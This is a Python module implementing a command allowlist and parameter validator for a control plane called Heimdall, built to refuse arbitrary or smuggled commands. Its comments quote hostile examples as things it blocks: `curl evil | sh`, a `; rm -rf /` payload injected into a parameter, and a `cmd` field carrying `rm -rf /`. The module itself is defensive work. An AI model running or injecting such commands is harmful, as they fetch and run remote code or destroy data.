#!/usr/bin/env python3
# cp_allowlist.py — piece (a) of the Heimdall control plane: THE SECURITY SPINE.
#
# DESIGN DOSSIER §1 (authoritative). This module is the falsifiable core of the
# whole control plane: the server NEVER dispatches an arbitrary command string. It
# dispatches ONLY a pre-defined, source-level `action_type` from a CLOSED registry
# (ALLOWLIST below). Everything else (PKI §3, audit §9, job runner §4) is plumbing
# around the blast-radius control this file pins.
#
# THE BLAST-RADIUS PROPERTY (the thesis): a fully breached server can trigger ONLY
# the N allowlisted actions against the isolated job env (§2). It cannot run
# `curl evil | sh`, cannot read a dev laptop, cannot exfiltrate keys. The allowlist
# is the blast-radius wall.
#
# THE FALSIFIABLE ASSERTION (§1, the integration gate's headline): a dispatch with
# an unknown action_type, OR an attempt to smuggle a command string (a `cmd`/
# `shell`/`exec` field, or a shell payload in a param) -> REFUSED (validate() raises
# RefusedDispatch -> the server returns HTTP 422 + an audit `dispatch_refused` row),
# runs NOTHING. A valid allowlisted dispatch with typed+bounded params -> accepted.
#
# NO-COMMAND-STRING-BY-CONSTRUCTION (the hard rule, enforced not advisory):
#   * There is NO command-string field ANYWHERE in this schema. A param is a typed,
#     bounded, pattern-validated SCALAR -- never a string the handler interprets as
#     a shell/command. The param-type classes below CANNOT express "an arbitrary
#     string to execute": every Str carries a maxlen AND a whitelist pattern; an
#     Enum is a closed set; an Int is bounded. There is no FreeStr / Raw / Cmd type.
#   * Adding a new action = a DELIBERATE, REVIEWED, source-level commit to THIS file
#     plus a handler in cp_handlers.py plus a secret-scan-clean test. It is NEVER a
#     runtime string, env var, DB row, or API call. The allowlist is code, reviewed
#     in PR, shipped in a release. There is no runtime path to extend it.
#
# THE INTERFACE pieces (b)-(f) BIND to (stable; they import, never edit):
#   ALLOWLIST                       — the frozen registry dict {action_type: ActionSpec}.
#   ActionSpec                      — handler ref + typed param spec + requires_gate + isolated.
#   validate(action_type, params)   — the ONE dispatch gate. Returns clean params on
#                                     success; raises RefusedDispatch on any refusal.
#   RefusedDispatch                 — the refusal exception (carries a reason code).
#   is_allowed(action_type)         — membership test (no fallthrough anywhere).
#
# stdlib-only (re/types) — minimal self-host deps, mirrors telemetry.py discipline.

from __future__ import annotations

import re
import types

# ── refusal exception (the ONE way a dispatch is refused — §1) ────────────────


class RefusedDispatch(Exception):
    """Raised by validate() when a dispatch must be REFUSED. The server maps this to
    HTTP 422 + an audit `dispatch_refused` row. `reason` is a short machine code
    (unknown_action | bad_param | command_smuggle | extra_param | missing_param);
    `detail` is a SHORT, secret-free human note (bounded, never echoes a value)."""

    def __init__(self, reason, detail=""):
        self.reason = reason
        self.detail = detail
        super().__init__("%s: %s" % (reason, detail) if detail else reason)


# ── param type classes (typed + bounded + pattern — NO free command string) ───
#
# Each class validates ONE scalar param. The cardinal rule (§1): NONE of these can
# express "an arbitrary string the handler executes". A Str ALWAYS carries a maxlen
# AND a whitelist pattern (no unbounded/unpatterned string exists). An Enum is a
# closed set. An Int is range-bounded. There is deliberately no FreeStr / Raw / Cmd.


class Str:
    """A bounded, pattern-whitelisted string scalar. maxlen is MANDATORY (mirrors
    telemetry._SCRUB_MAX discipline); pattern is MANDATORY — a Str with no pattern
    cannot be constructed, so no param can ever be an arbitrary free string. The
    pattern is a WHITELIST (fullmatch): only the characters/shape it permits pass.
    A value over maxlen OR not fully matching the pattern is REFUSED."""

    def __init__(self, *, maxlen, pattern):
        if not isinstance(maxlen, int) or maxlen <= 0 or maxlen > 256:
            # a Str param is a short identifier-shaped tag, never a payload; cap the
            # cap itself so no action can declare a 1MB "string" param.
            raise ValueError("Str maxlen must be 1..256")
        if not pattern:
            raise ValueError("Str requires a whitelist pattern (no free strings)")
        self.maxlen = maxlen
        self._rx = re.compile(pattern)

    def validate(self, name, value):
        if not isinstance(value, str):
            raise RefusedDispatch("bad_param", "%s must be a string" % name)
        if len(value) > self.maxlen:
            raise RefusedDispatch("bad_param", "%s exceeds maxlen" % name)
        if not self._rx.fullmatch(value):
            # off-pattern -> refused. This is what stops a shell payload smuggled
            # into an otherwise-typed param: `; rm -rf /` never matches an id pattern.
            raise RefusedDispatch("bad_param", "%s fails pattern" % name)
        return value


class Enum:
    """A closed set of permitted string values. The strongest bound — the value MUST
    be one of a small, source-pinned set. Anything else is REFUSED. An Enum cannot
    carry an arbitrary string by construction."""

    def __init__(self, *choices):
        if not choices:
            raise ValueError("Enum requires at least one choice")
        self.choices = tuple(choices)

    def validate(self, name, value):
        if value not in self.choices:
            raise RefusedDispatch("bad_param", "%s not in allowed set" % name)
        return value


class Int:
    """A range-bounded integer scalar. lo/hi are mandatory; a value outside [lo,hi]
    or non-integer is REFUSED. Carries no string payload at all."""

    def __init__(self, *, lo, hi):
        if not (isinstance(lo, int) and isinstance(hi, int) and lo <= hi):
            raise ValueError("Int requires lo<=hi integers")
        self.lo = lo
        self.hi = hi

    def validate(self, name, value):
        if isinstance(value, bool) or not isinstance(value, int):
            raise RefusedDispatch("bad_param", "%s must be an integer" % name)
        if value < self.lo or value > self.hi:
            raise RefusedDispatch("bad_param", "%s out of range" % name)
        return value


class Bool:
    """A STRICT boolean scalar. ONLY Python True/False pass — an int (even 0/1), a string
    ("true"/"1"/"yes"), or any other type is REFUSED. Strictness is load-bearing: this type
    backs the `explicit` maintainer-authorization flag, so a truthy-but-untyped value can
    never coerce its way into authorizing a cycle. Carries no string payload at all."""

    def validate(self, name, value):
        if not isinstance(value, bool):
            raise RefusedDispatch("bad_param", "%s must be a boolean" % name)
        return value


class Opt:
    """Marks a DECLARED param as OPTIONAL: absent from the request -> skipped (NOT a
    missing_param refusal); present -> validated by the inner bounded type. Optionality
    NEVER relaxes the command-smuggle wall — an UNKNOWN key is still refused (extra_param)
    exactly as before; Opt only lets a declared param be omitted. The inner spec is a real
    bounded type (Str/Enum/Int); Opt adds NO free-string escape hatch (it forwards to the
    inner validate, which still enforces the maxlen/pattern/range). By construction an
    optional param cannot be an arbitrary command string any more than a required one."""

    def __init__(self, inner):
        if not hasattr(inner, "validate"):
            raise ValueError("Opt requires a bounded param type exposing validate()")
        self.inner = inner

    def validate(self, name, value):
        return self.inner.validate(name, value)


# ── shared whitelist patterns (identifier-shaped, never shell-shaped) ──────────
#
# A task id is a short slug: lowercase alnum + dash, nothing else. Crucially this
# excludes EVERY shell metacharacter (; | & $ ` > < ( ) space quotes), so a command
# payload cannot pass an id-shaped Str param — the falsifiable smuggle attempt RED.
TASK_ID_RE = r"[a-z0-9][a-z0-9-]{0,63}"

# A repo slug: <owner>/<name>, each side ASCII word-chars + dot + dash, exactly ONE
# slash. ASCII-explicit (not \w) so a unicode homoglyph cannot ride in. Like TASK_ID_RE
# this excludes EVERY shell metacharacter (; | & $ ` > < ( ) space quotes) AND whitespace,
# so a command payload cannot pass the repo param — the falsifiable smuggle attempt stays
# RED. The single required slash bounds it to one owner/name pair (no deep path).
REPO_SLUG_RE = r"[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+"


# ── ActionSpec (the registry entry — §1) ──────────────────────────────────────


class ActionSpec:
    """One allowlist entry. Binds an action_type to:
      handler       — a dotted "module.func" ref RESOLVED at dispatch by the server
                      against a registered handler map (cp_handlers / b-f register
                      seams). It is a NAME, never code-from-the-wire.
      params        — an ordered dict {param_name: <type instance>}. EVERY declared
                      param is validated; NO param may be a free command string
                      (the type classes forbid it structurally).
      requires_gate — True ⇒ the action surfaces to the owner approval queue (§7)
                      before executing (e.g. run-suite).
      isolated      — True ⇒ the action runs in the §2 isolated low-priv job env
                      that CANNOT read the PKI key / audit log / server secrets.

    There is NO `command`/`cmd`/`shell`/`exec` field on ActionSpec — by construction
    a spec cannot name a command to run; it names a registered handler + typed
    params only."""

    def __init__(self, *, handler, params, requires_gate, isolated):
        if not isinstance(handler, str) or "." not in handler:
            raise ValueError("handler must be a dotted 'module.func' ref")
        if not isinstance(params, dict):
            raise ValueError("params must be a dict of typed specs")
        for pname, spec in params.items():
            if not isinstance(pname, str) or not pname:
                raise ValueError("param name must be a non-empty string")
            if not hasattr(spec, "validate"):
                raise ValueError("param %r spec must expose validate()" % pname)
        self.handler = handler
        self.params = dict(params)
        self.requires_gate = bool(requires_gate)
        self.isolated = bool(isolated)

    def validate_params(self, params):
        """Validate a raw params dict against this spec. Returns a NEW dict of the
        validated params (the handler receives ONLY these — never the raw request
        body, never an extra key). Raises RefusedDispatch on:
          * a non-dict params payload,
          * a missing declared param,
          * an EXTRA param not in the spec (no smuggling an unrecognized field),
          * any param failing its typed/bounded/pattern check.
        Defence in depth: an unexpected extra key is refused, so a `cmd`/`shell`/
        `exec` key smuggled alongside valid params is REFUSED, never ignored."""
        if not isinstance(params, dict):
            raise RefusedDispatch("bad_param", "params must be an object")
        extra = set(params.keys()) - set(self.params.keys())
        if extra:
            # NO unrecognized field passes — this is the command-smuggle wall: a
            # request carrying {"task_id": "...", "cmd": "rm -rf /"} is REFUSED on
            # the extra `cmd` key alone, before any handler sees it.
            raise RefusedDispatch(
                "extra_param", "unexpected: %s" % ",".join(sorted(extra)))
        clean = {}
        for pname, spec in self.params.items():
            if pname not in params:
                # an OPTIONAL param (Opt) may be omitted — skip it; a REQUIRED one absent
                # is a refusal. Optionality does NOT weaken the extra-key wall above.
                if isinstance(spec, Opt):
                    continue
                raise RefusedDispatch("missing_param", "missing %s" % pname)
            clean[pname] = spec.validate(pname, params[pname])
        return clean


# ── THE FROZEN ALLOWLIST (the closed registry — §1) ────────────────────────────
#
# This is THE decision. A bounded set of action types, each with TYPED + BOUNDED
# params. Adding an entry = a reviewed source commit. Frozen at module level (a
# MappingProxyType below makes the dict itself read-only at runtime — no code path
# can append an entry at runtime).

_ALLOWLIST = {
    # run-task-X: run a single named queued task. task_id is an id-shaped slug —
    # bounded + whitelist-patterned, so no shell payload can ride in it.
    "run-task-X": ActionSpec(
        handler="cp_handlers.run_task",
        params={"task_id": Str(maxlen=64, pattern=TASK_ID_RE)},
        requires_gate=False,
        isolated=True,
    ),
    # sync-queue: reconcile one of the two named queues. `queue` is a closed Enum.
    "sync-queue": ActionSpec(
        handler="cp_handlers.sync_queue",
        params={"queue": Enum("issue", "gate")},
        requires_gate=False,
        isolated=True,
    ),
    # run-suite: run a named test suite. requires_gate=True ⇒ surfaces to the owner
    # approval queue (§7) before executing — an irreversible/sensitive action.
    "run-suite": ActionSpec(
        handler="cp_handlers.run_suite",
        params={"suite": Enum("unit", "integration", "oracle")},
        requires_gate=True,
        isolated=True,
    ),
    # run-maintainer-cycle: drive N bounded maintainer cycles of the durable autopilot
    # loop (bin/heimdall-maintain-loop) against ONE repo. THE SECURITY SPINE HOLDS BY
    # CONSTRUCTION: the params are typed+bounded SCALARS only — a repo slug (owner/name,
    # no shell metachars), a bounded cycle count, an OPTIONAL bounded token budget. There
    # is NO free-form prompt/cmd/shell/exec param, and validate_params REFUSES any extra
    # key (extra_param), so a control-plane breach can NEVER smuggle a prompt or command
    # through this action. The maintainer prompt is built INSIDE heimdall-maintain-loop
    # from the queued GitHub issue — NEVER a control-plane param. isolated=True (runs in
    # the §2 low-priv job env); requires_gate=False (the loop is itself budget/approval/
    # stop-guarded and only OPENS PRs on scoped heimdall/* branches — it never pushes main
    # or merges, so a human still gates the merge).
    "run-maintainer-cycle": ActionSpec(
        handler="cp_handlers.run_maintainer_cycle",
        params={
            "repo": Str(maxlen=128, pattern=REPO_SLUG_RE),
            "max": Int(lo=1, hi=100),
            "budget_tokens": Opt(Int(lo=1, hi=100_000_000)),
            # explicit: an OPTIONAL strict-boolean AUTHORIZATION flag. Set ONLY by the gated,
            # server-side drain (cp_maintainer_runner.drain_team_queue) when a cycle
            # originates from an EXPLICIT rr task a user signed + submitted — that submission
            # IS the authorization, so the maintainer runs WITHOUT a local heimdall-state.json
            # enable flag (which never exists in the ephemeral Cloud Run Job container). It is
            # NEVER settable from the rr-task TEXT / request body: the public surface only
            # ENQUEUES task text (a closed-schema, scrubbed DATA record — extra keys dropped),
            # and the drain builds these params FROM SCRATCH, never copying a task field.
            # Bool() is strict (True/False only), so a truthy-but-untyped value can't coerce
            # it on. The extra-key wall still refuses any UNKNOWN param, so this widening does
            # not open a smuggle channel — it names one more typed, bounded, closed-set scalar.
            "explicit": Opt(Bool()),
        },
        requires_gate=False,
        isolated=True,
    ),
    # aggregate-issues: the DAILY k-anon fold of the ANONYMIZED ISSUE store (Wave 3,
    # issue-collection). Rolls the isolated heimdall_corpus/issues/ partitions into the
    # published k-anon aggregate (cp_issue_aggregate.run_daily_aggregate) — a DATA-ONLY
    # job that reads + writes ONLY the corpus namespace, dispatches nothing, spawns no
    # process, makes no model call. THE SECURITY SPINE HOLDS BY CONSTRUCTION: the ONE
    # optional param is a bounded Int k-anon override (never a free string / cmd / prompt),
    # and validate_params refuses any extra key, so a breach cannot smuggle a command
    # through this action. isolated=True (§2 low-priv env); requires_gate=False (a bounded,
    # reversible aggregate that only ever SUPPRESSES below the k-anon floor — never opens a
    # PR, never touches control-plane state). A cron fires it once a day via cp_scheduler,
    # which re-validates through THIS gate at both create- and fire-time.
    "aggregate-issues": ActionSpec(
        handler="cp_handlers.aggregate_issues",
        # k_min: an OPTIONAL bounded distinct-team k-anon override (mirrors the CLI --k-min).
        # Absent -> the handler uses issue_corpus.ISSUE_K_ANONYMITY_MIN (=10). A bounded Int
        # only — it can carry no shell/command payload. Raising it only SUPPRESSES more
        # buckets (fail-safe toward MORE privacy); it can never surface a sub-threshold cell.
        params={"k_min": Opt(Int(lo=1, hi=1000))},
        requires_gate=False,
        isolated=True,
    ),
    # synth-issues: the DAILY SHADOW-synthesis of candidate GitHub issues from the k-anon
    # aggregate (Wave 3, issue-collection). Clusters k-anon-cleared signature buckets into
    # SHADOW proposals (cp_issue_synth.run_synthesis) a maintainer promotes by hand — it
    # enforces nothing, auto-opens NOTHING, dispatches nothing, makes no model call. SAME
    # blast-radius wall as aggregate-issues: the ONE optional param is a bounded Int support
    # floor (never a free string / cmd / prompt), extra keys refused. isolated=True;
    # requires_gate=False (SHADOW-only — every proposal is pending_review/enforced=False, so
    # the human gate is downstream at promotion, not here). Cron-fired via cp_scheduler.
    "synth-issues": ActionSpec(
        handler="cp_handlers.synth_issues",
        # min_teams: an OPTIONAL bounded distinct-team SUPPORT floor a signature cluster must
        # clear before it becomes a candidate (mirrors the CLI --min-teams). Absent -> the
        # handler uses the imported k-anon floor. A bounded Int only; no free-string payload.
        params={"min_teams": Opt(Int(lo=1, hi=1000))},
        requires_gate=False,
        isolated=True,
    ),
}

# Freeze the registry: a read-only proxy so no runtime code can add an action_type.
# Adding an action is a SOURCE edit to _ALLOWLIST above, never a runtime mutation.
ALLOWLIST = types.MappingProxyType(_ALLOWLIST)


# ── the dispatch gate (the ONE validation entry — §1) ──────────────────────────


def is_allowed(action_type):
    """Membership test against the frozen registry. The ONLY way an action_type is
    recognized. No fallthrough, no prefix match, no wildcard — exact membership."""
    return action_type in ALLOWLIST


def spec_for(action_type):
    """Return the ActionSpec for an allowlisted action_type, or raise RefusedDispatch
    (unknown_action) for anything not in the frozen registry."""
    if action_type not in ALLOWLIST:
        raise RefusedDispatch("unknown_action", "action_type not allowlisted")
    return ALLOWLIST[action_type]


def validate(action_type, params):
    """THE dispatch gate (§1). Returns a dict:
        {handler, params, requires_gate, isolated}
    where `params` is the validated, typed, bounded param dict the handler receives.

    Raises RefusedDispatch (-> server 422 + audit dispatch_refused) when:
      * action_type not in ALLOWLIST (unknown_action) — no shell, no eval, no fallthrough,
      * params is not an object, has a missing/extra param, or any param fails its
        typed/bounded/pattern check (the command-smuggle wall).

    This is the falsifiable core: a build that let an arbitrary command through would
    have to ADD a free-string param type or a command field here — which would RED
    the substrate test. The handler NEVER receives a raw string to interpret."""
    spec = spec_for(action_type)            # unknown_action -> refused
    clean = spec.validate_params(params)    # bad/extra/missing param -> refused
    return {
        "handler": spec.handler,
        "params": clean,
        "requires_gate": spec.requires_gate,
        "isolated": spec.isolated,
    }


def action_types():
    """The sorted list of allowlisted action types (for status/CLI introspection)."""
    return sorted(ALLOWLIST.keys())
